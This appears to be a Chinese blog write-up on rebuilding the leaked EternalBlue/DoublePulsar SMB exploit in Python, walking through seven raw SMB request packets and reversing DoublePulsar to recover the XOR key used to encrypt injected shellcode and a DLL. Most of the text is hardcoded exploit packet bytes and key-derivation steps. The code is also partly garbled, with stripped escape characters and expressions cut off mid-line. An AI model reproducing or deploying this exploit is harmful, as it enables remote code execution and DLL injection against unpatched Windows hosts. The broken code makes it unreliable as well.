length这些基本数据包的知识我们知道了就可以去修改,怎么检测自己的手动发的数据包是否和NSA工具发的包一样呢?一共是7个包对应七个请求,用python发包,然后recv回来的数据和我们用wireshark抓到工具复现的包相同就说明自己包没问题然后接着去发下一条请求再去判断。  
    #smb 头是32字节 请求包50字节 以下一行30字节 smb版本
    First_Request = "x00x00x00x85xFFx53x4Dx42x72x00x00x00x00x18x53xC0x00x00x00x00x00x00x00x00x00x00x00x00x00x00xFFxFEx00x00x40x00x00x62x00x02x50x43x20x4Ex45x54x57x4Fx52x4Bx20x50x52x4Fx47x52x41x4Dx20x31x2Ex30x00x02x4Cx41x4Ex4Dx41x4Ex31x2Ex30x00x02x57x69x6Ex64x6Fx77x73x20x66x6Fx72x20x57x6Fx72x6Bx67x72x6Fx75x70x73x20x33x2Ex31x61x00x02x4Cx4Dx31x2Ex32x58x30x30x32x00x02x4Cx41x4Ex4Dx41x4Ex32x2Ex31x00x02x4Ex54x20x4Cx4Dx20x30x2Ex31x32x00"
    #windows系统版本Second_Request ="x00x00x00x88xFFx53x4Dx42x73x00x00x00x00x18x07xC0x00x00x00x00x00x00x00x00x00x00x00x00x00x00xFFxFEx00x00x40x00x0DxFFx00x88x00x04x11x0Ax00x00x00x00x00x00x00x01x00x00x00x00x00x00x00xD4x00x00x00x4Bx00x00x00x00x00x00x57x00x69x00x6Ex00x64x00x6Fx00x77x00x73x00x20x00x32x00x30x00x30x00x30x00x20x00x32x00x31x00x39x00x35x00x00x00x57x00x69x00x6Ex00x64x00x6Fx00x77x00x73x00x20x00x32x00x30x00x30x00x30x00x20x00x35x00x2Ex00x30x00x00x00"
第三个请求有点问题就是目标ipc主机的ip 因为ip的Length不是固定的所以这里采用chr(len(str_ip))方式来写进NetBIOS
还有一点就是我们如何自定义ip 这里是UNICODE编码注意下 所以写了一个转Unicode的方法
    def make_unicode_host(org_host):host_len = len(org_host)new_host = ""for i in range(host_len):new_host =new_host + "x00" + org_host[i]return new_host
    Third_Request ="x00x00x00"+chr(len(str_ip))+"xFFx53x4Dx42x75x00x00x00x00x18x07xC0x00x00x00x00x00x00x00x00x00x00x00x00x00x00xFFxFEx00x08x40x00x04xFFx00x60x00x08x00x01x00x35x00x00x5Cx00x5C"+ make_unicode_host(HOST)+"x00x5Cx00x49x00x50x00x43x00x24x00x00x00x3Fx3Fx3Fx3Fx3Fx00"
    Fourth_Request ="x00x00x00x4ExFFx53x4Dx42x32x00x00x00x00x18x07xC0x00x00x00x00x00x00x00x00x00x00x00x00x00x08xFFxFEx00x08x41x00x0Fx0Cx00x00x00x01x00x00x00x00x00x00x00x40x69x7Ax00x00x00x0Cx00x42x00x00x00x4Ex00x01x00x0Ex00x0Dx00x00x00x00x00x00x00x00x00x00x00x00x00x00"
看第五个请求.内容很多看下面的大小是4096个字节猜测smb最多一次就发送4096个字节,下一个请求包和这个请求应该是有联系的。这时候猜测可能就是后门一些操作了
而且这些字符显然是加密的
看第六个请求:1800个字节,猜测应该是一个文件传输的结束.文件未出现了出现了“85 79 52 a6 85 79 5a
81”这串字符串我们注入的是dll而熟悉PE文件的人应该知道dll的MZ头是
4D5A,而dll文件是以00 00 00 00 00…结尾。数据包里面没有4D5A这个hex值,推测是把shellcode和dll的hex一块加密大小为
4096+1800
看第六个包设想数据包的加密方式如果是异或那么只要秘钥为7985a15a(小端存储)才能将数据包中的dll尾部数据还原为00 00 00
****
**第四步:多次对比数据包定位用户随机秘钥**
有了秘钥那我们用秘钥把前面的shellcode也解密然后再加上我们自己dll再用秘钥加密发送不就可以了么。事实证明也不是这样的密钥是随机生成的
上面提到如果7985a15a是秘钥的话才能将dll尾部数据还原为0 可事实是,每次用NSA工具重现的时候生成的秘钥都是不一样的,而且我也发现个有意思的地方
当秘钥是7985a15a时工具中给你显示出了这样一段数据
这正是我们要找的秘钥。它在工具里面显示了,这时候要知道 fb.py这只是个框架,功能都是由他去调用分目录下的脚本,比如说eternalblue
比如说Doublepulsar,也是fb.py的一个框架
但Doublepulsar不是脚本,它是一个exe,我们就去逆向一下这个exe看看秘钥是怎么计算的
直接搜索XOR_Key然后ctrlX来到引用处F5
回溯v21 经过多次复现对比秘钥发现了在第四次的返回包中signature字段发生了变化 其余请求的返回包中的signature字段都为00000000
读到返回包用py切片return smb_data[18:22]把Signature前四个字节取出 然后转为小端存储
struct.unpack("> 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  
    得到的x就是工具中显示的XOR_Key :xxxxxx 我们还要把他转换成数据包里的秘钥小端变大端 key=struct.pack(" 0:
    time.sleep(delta)
    start = time.time()
    if i[0] == "connect":
    sock = socket.socket()
    sock.connect((HOST , PORT ))